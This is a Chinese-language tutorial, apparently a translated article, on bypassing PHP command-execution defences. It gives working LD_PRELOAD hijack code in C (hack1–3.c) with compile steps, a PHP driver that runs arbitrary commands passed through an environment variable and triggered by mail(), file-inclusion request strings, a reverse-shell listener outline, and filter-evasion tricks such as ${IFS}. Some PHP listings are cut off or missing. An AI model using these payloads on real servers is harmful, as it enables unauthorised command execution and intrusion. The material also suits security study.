# 浅谈命令执行的绕过方法
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 前言
命令执行漏洞已经学过很久了，但一直没有系统地简单总结一下命令执行的绕过方法。这里简单归纳总结一下：
## 0x01 常见的命令执行函数
因为之前已经详细总结过，这里只总结一些常见的:
    system()    #输出并返回最后一行shell结果。
    exec()      #不输出结果，返回最后一行shell结果，所有结果保存到一个返回数组里。
    passthru()  #只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。
    popen()、proc_open() #不会直接返回执行结果，而是返回一个文件指针
    shell_exec()#通过shell执行命令并以字符串的形式返回完整的输出
    反引号       #实际上是使用shell_exec()函数
## 0x02 常见命令分隔符、终止符和截断符号
在命令执行漏洞的考察中，主要用到了`命令分隔符`：
###  1、命令分隔符
    windows： &&  ||  &  | 
    linux：   &&  ||  &  |   ;
    #分号;在shell中担任连续指令的功能
    #下面的需php环境
    %0a 换行符
    %0d 回车符
###  2、命令终止符
    #需php环境
    %00
    %20#
###  3、截断符号
    $
    ;
    |
    &
    -    (
    )
    {
    }
    反引号
    ||
    &&
    %0a #有时可当空格使用
## 0x03 命令执行绕过
一般情况下，遇到的命令执行绕过我简单总结成以下主要的四种情况：
    1.disable_function
    2.过滤字符
    3.命令盲注
    4.无回显的命令执行
###  1、disable_function
在`php.ini`文件里，使用disable_function选项，可以禁用一些PHP危险函数。
通过查看phpinfo信息，可以浏览器上看到`disable_function`禁用的函数。
当我们发现一个可以代码执行的地方，传入命令执行函数去执行系统命令，发现并不能成功，原因就是在`php.ini`文件里使用`disable_function`选项禁用了命令执行有关的危险函数。如对`disable_function`进行如下配置：
    disable_functions = system,exec,shell_exec,passthru,proc_open,proc_close, proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport, syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept, socket_connect, stream_socket_server, stream_socket_accept,stream_socket_client,ftp_connect, ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space, disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd, posix_getegid,posix_geteuid,posix_getgid, posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid, posix_getppid,posix_getpwnam,posix_getpwuid, posix_getrlimit, posix_getsid,posix_getuid,posix_isatty, posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid, posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname
查阅大师傅的博客，发现绕过disable_function有以下两种最常用的方法：
> 1.ld_preload  
>  2.php_gc
####  1.ld_preload
**利用场景** ：实现了代码执行，未实现命令执行，且没有禁用`mail`函数  
 **利用条件** ：  
（1）没有禁用`mail`函数。  
（2）站点根目录具有写文件权限  
或其他目录具有写文件权限，并且可以在url上跳转到其他目录访问上传的php文件  
或其他目录具有写文件权限，利用代码执行实现本地文件包含，包含最后要访问的php文件  
 **相关知识** ：  
LD_PRELOAD 劫持系统函数
> LD_PRELOAD
> 是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。
>
>
> php中的mail、error_log函数是通过调用系统中的sendmail命令实现的(其他类似php中的函数还有imap_mail、mb_send_mail参考)，sendmail二进制文件中使用了getuid库函数，这样我们可以覆盖getuid函数。
**利用过程1** ：  
于是可以通过利用环境变量`LD_PRELOAD`劫持系统函数，让外部程序加载恶意的.so文件，达到执行系统命令的效果。具体步骤如下：  
（1）编写一个c文件，实现我们自己的动态链接程序  
`hack1.c`
    #include 
    #include 
    #include 
    void payload(){
        system("ls /var/www/html > /tmp/smity");
    }
    int geteuid()
    {
        if(getenv("LD_PRELOAD") == NULL){ return 0; }
        unsetenv("LD_PRELOAD");
        payload();
    }
通过设置`preload`可以劫持比较底层的函数。这里劫持了`geteuid`函数  
（2）将带有系统命令的c文件`hack1.c`编译成为一个动态共享库，生成.so文件`hack1.so`
    gcc -c -fPIC hack1.c -o hack1
    gcc --share hack1 -o hack1.so
（3）通过`putenv`设置`LD_PRELOAD`，让`hack1.so`优先被调用。并通过mail函数发送一封邮件来触发。  
`qwzf1.php`
（4）如果站点根目录有文件写入权限，直接利用代码执行(或蚁剑上传)在站点根目录传入`hack1.so`和`qwzf1.php`文件。访问php文件，就会运行刚才c文件里写的`ls`命令，最后就可以在`/tmp/smity`文件中看到`ls`的结果了。  
然而，使用蚁剑上传`hack1.so`和`qwzf1.php`文件，发现站点根目录并没有文件写入权限。同时发现`/tmp/`目录具有文件写入权限。  
于是我考虑使用蚁剑上传`hack1.so`和`qwzf1.php`文件到`/tmp/`目录下，然后利用代码执行实现文件包含漏洞包含`qwzf1.php`文件，实现访问php文件的效果：
    ?code=include('/tmp/qwzf1.php');
查看`/tmp/smity`
上面实现了劫持函数绕过disable_function。
**利用过程2** ：  
但如果需要执行多条命令，一步一步的操作似乎有点麻烦，有什么好方法可以只需编译一次c文件，连续执行任意命令呢？  
查阅大师傅博客发现：可以通过设置`EVIL_CMDLINE`环境变量的方式实现。大致步骤和上面的差不多，只不过 `c文件和php文件`的文件内容变了  
（1）`hack2.c`
    #include 
    #include 
    #include 
    int geteuid()
    {
        const char* cmdline = getenv("EVIL_CMDLINE"); //获得系统的环境变量EVIL_CMDLINE
        if(getenv("LD_PRELOAD") == NULL){ return 0; }
        unsetenv("LD_PRELOAD"); //删除系统变量
        system(cmdline);
    }
（2）将c文件编译成动态链接库：
    gcc -shared -fPIC hack2.c -o hack2.so
（3）`qwzf2.php`
     ".$out_path." 2>&1"; //2>&1将标准错误重定向到标准输出
    echo "cmdline: ".$evil_cmdline; //打印显示实际在linux上执行的命令
    putenv("EVIL_CMDLINE=".$evil_cmdline); //将执行的命令，配置成系统环境变量EVIL_CMDLINE
    $so_path = $_REQUEST["sopath"]; //传入.so文件
    putenv("LD_PRELOAD=".$so_path); //将.so文件路径配置成系统环境变量LD_PRELOAD
    mail("", "", "", ""); //mail函数调用系统中的sendmail命令，sendmail二进制文件中使用了getuid库函数。调用.so文件里的getuid函数，实现覆盖getuid函数。
    echo "output: ".nl2br(file_get_contents($out_path));
    //nl2br()函数在字符串中的每个新行（\n）之前插入HTML换行符
    //file_get_contents() 把整个文件读入一个字符串中。即把最后命令执行结果从文件读取成字符串
    ?>
（4）将`hack2.so`文件和`qwzf2.php`文件，通过代码执行写入(或使用蚁剑直接上传)具有写入权限的目录。  
然后在浏览器上测试：
    http://x.x.x.165:8001/?code=include('/tmp/qwzf2.php');
    post: cmd=ls&outpath=/tmp/test&sopath=/tmp/hack2.so
测试成功！
**利用过程3** ：  
有没有一种方法可以不劫持函数绕过 disable_function呢？  
查阅大师傅博客发现了不劫持函数绕过 disable_function的方法：
> GCC 有个 C 语言扩展修饰符attribute((constructor))，可以让由它修饰的函数在 main()
> 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行attribute((constructor)) 修饰的函数。
只需要找到php环境中存在执行系统命令的函数、且putenv函数未被禁用的情况下，就可以绕过disable_function。  
（1）`hack3.c`
    #include 
    void payload(void){
        system("ls /var/www/html > /tmp/smity");
    }
    __attribute__ ((__constructor__)) void exec(void){
        if (getenv("LD_PRELOAD") == NULL){ return 0; }
        unsetenv("LD_PRELOAD");
        payload();
        return 0;
    }
（2）将c文件编译成动态链接库：
    gcc -shared -fPIC hack3.c -o hack3.so
（3）`qwzf3.php`
（4）将`hack3.so`和`qwzf3.php`写入到具有文件写入权限的目录下，利用代码执行实现文件包含访问
    ?code=include('/tmp/qwzf3.php');
查看`/tmp/smity`文件，得到命令执行结果
####  2.php_gc
**利用场景** ：实现了代码执行，未实现命令执行  
 **利用条件** ：php7.0 = 4.2.0, PHP 5  
 **相关知识** ：
> pcntl是linux下的一个扩展，可以支持php的多线程操作。(与python结合反弹shell)
> pcntl_exec函数的作用是在当前进程空间执行指定程序
**一般步骤** ：
  1. 利用蚁剑连接shell代码执行
  2. 将下面的php代码传上去然后访问
  3. 在公网服务器监听端口，实现反弹shell
**利用代码** ：
监听利用代码中填写的端口
    nc -lvvp 4444
不想再重新搭建环境，所以这个地方没进行复现。。。
###  2、绕过过滤字符
####  1.空格绕过
    ${IFS}
    $IFS$9 #$9可改成$加其他数字
         #重定向符
    {cat,flag.php}  #用逗号,实现了空格功能
    %20
    %09
**1.`${IFS}`**  
这算是Linux中的一个变量
> Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符（internal field separator）。IFS环境变量定义了bash